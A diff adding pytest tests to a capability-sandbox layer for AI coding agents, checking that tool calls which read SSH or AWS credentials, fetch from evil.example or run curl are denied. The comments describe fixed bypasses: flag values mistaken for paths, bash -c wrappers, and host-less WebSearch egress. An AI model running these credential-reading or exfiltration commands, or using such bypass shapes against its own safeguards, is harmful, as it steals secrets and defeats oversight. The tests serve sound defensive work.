@@ -549,3 +549,160 @@ def test_canonical_case_still_works_after_case_fix(tmp_path):
     req = to_call_request("WebFetch", {"url": "https://evil.example/stage2.sh"})
     assert req.tool == "net_fetch"
     assert req.host == "evil.example"
+
+
+# --------------------------------------------------------------------------- #
+# fix-fileread-flag-arg-bypasses-path-deny — head/tail/cat -n flag value must
+# NOT be grabbed as the path (it let head -n 5 ~/.ssh/id_rsa slip past the deny)
+# --------------------------------------------------------------------------- #
+def test_head_n_flag_value_not_grabbed_as_path():
+    # Before the fix args[0]="5" was the path, so the ~/.ssh deny never fired.
+    req = to_call_request("Bash", {"command": "head -n 5 ~/.ssh/id_rsa"})
+    assert req.path == "~/.ssh/id_rsa"
+
+
+def test_tail_c_flag_value_not_grabbed_as_path():
+    req = to_call_request("Bash", {"command": "tail -c 256 ~/.aws/credentials"})
+    assert req.path == "~/.aws/credentials"
+
+
+def test_head_n_flag_ssh_denied_under_network_deny(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "head -n 5 ~/.ssh/id_rsa"})
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_head_no_flag_case_unchanged():
+    # Regression guard: the flag-less shape must still extract the path.
+    req = to_call_request("Bash", {"command": "head ~/.ssh/id_rsa"})
+    assert req.path == "~/.ssh/id_rsa"
+
+
+def test_cat_relative_filename_unchanged():
+    # A bare relative filename (no / no ~) still surfaces as the target.
+    req = to_call_request("Bash", {"command": "cat notes.txt"})
+    assert req.path == "notes.txt"
+
+
+# --------------------------------------------------------------------------- #
+# fix-shell-c-subcommand-bypasses-file-read-deny — bash/sh -c hides a file read
+# behind an interpreter wrapper; recurse so the hidden path deny fires
+# --------------------------------------------------------------------------- #
+def test_bash_c_cat_ssh_recurses_to_path():
+    req = to_call_request("Bash", {"command": 'bash -c "cat ~/.ssh/id_rsa"'})
+    assert req.path == "~/.ssh/id_rsa"
+
+
+def test_sh_c_cat_aws_recurses_to_path():
+    req = to_call_request("Bash", {"command": "sh -c 'cat ~/.aws/credentials'"})
+    assert req.path == "~/.aws/credentials"
+
+
+def test_bash_c_cat_ssh_denied_under_network_deny(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": 'bash -c "cat ~/.ssh/id_rsa"'})
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_bash_c_curl_still_network_denied(tmp_path):
+    # Regression guard: a URL hidden in -c was already caught by the raw scan;
+    # recursion must not change that.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": 'bash -c "curl https://evil.example"'})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_bash_lc_combined_flag_recurses():
+    # A combined short-flag cluster (-lc) ending in c must be treated as -c.
+    req = to_call_request("Bash", {"command": 'bash -lc "cat ~/.ssh/id_rsa"'})
+    assert req.path == "~/.ssh/id_rsa"
+
+
+# --------------------------------------------------------------------------- #
+# fix-netfetch-no-url-egress-bypass — a host-less net_fetch (WebSearch) must
+# still consult the network rule (fail-closed), not be waved through
+# --------------------------------------------------------------------------- #
+def test_websearch_no_url_carries_host():
+    # Before the fix WebSearch (no url) had host=None and consulted no rule.
+    req = to_call_request("WebSearch", {"query": "leaked-secret"})
+    assert req.host is not None
+
+
+def test_websearch_denied_under_network_deny(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("WebSearch", {"query": "leaked-secret"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_webfetch_https_unchanged_after_netfetch_fix():
+    # Regression guard: a resolvable https host is still extracted, path None.
+    req = to_call_request("WebFetch", {"url": "https://evil.example/x"})
+    assert req.host == "evil.example"
+    assert req.path is None
+
+
+def test_webfetch_file_url_unchanged_after_netfetch_fix():
+    req = to_call_request("WebFetch", {"url": "file://~/.ssh/id_rsa"})
+    assert req.path == "~/.ssh/id_rsa"
+    assert req.host is not None  # fail-closed sentinel still carried
+
+
+# --------------------------------------------------------------------------- #
+# feature-report-json-output — `capsule report --json` emits a machine-readable
+# run summary a CI pipeline can consume (jq .blocked)
+# --------------------------------------------------------------------------- #
+def test_report_json_emits_valid_summary(tmp_path, monkeypatch):
+    import json as _json
+
+    monkeypatch.chdir(REPO_ROOT)
+    log_path = tmp_path / "trap.log"
+    runner = CliRunner()
+    runner.invoke(
+        cli,
+        ["run", "-p", str(NETWORK_DENY), "--skill", str(DEMO_SKILL),
+         "--log", str(log_path)],
+    )
+    result = runner.invoke(cli, ["report", "--log", str(log_path), "--json"])
+    assert result.exit_code == 0, result.output
+    payload = _json.loads(result.output)
+    assert payload["allowed"] == 1
+    assert payload["blocked"] == 4
+    assert payload["total"] == 5
+    assert payload["log"] == str(log_path)
+    assert payload["events"], "events list must not be empty for a real run"
+    ev = payload["events"][0]
+    for key in ("ts", "skill", "tool", "effect", "rule", "reason"):
+        assert key in ev, f"event missing key {key!r}"
+
+
+def test_report_json_empty_log(tmp_path):
+    import json as _json
+
+    # A non-existent / empty log with --json yields a zeroed summary, exit 0.
+    runner = CliRunner()
+    result = runner.invoke(cli, ["report", "--log", str(tmp_path / "nope.log"), "--json"])
+    assert result.exit_code == 0, result.output
+    payload = _json.loads(result.output)
+    assert payload == {"allowed": 0, "blocked": 0, "total": 0,
+                       "log": str(tmp_path / "nope.log"), "events": []}
+
+
+def test_report_table_unchanged_without_json(tmp_path, monkeypatch):
+    # Regression guard: without --json the human-readable rich table still renders.
+    monkeypatch.chdir(REPO_ROOT)
+    log_path = tmp_path / "trap.log"
+    runner = CliRunner()
+    runner.invoke(
+        cli,
+        ["run", "-p", str(NETWORK_DENY), "--skill", str(DEMO_SKILL),
+         "--log", str(log_path)],
+    )
+    result = runner.invoke(cli, ["report", "--log", str(log_path)])
+    assert result.exit_code == 0
+    assert "blocked" in result.output
+    assert "curl-exfil-demo" in result.output
+
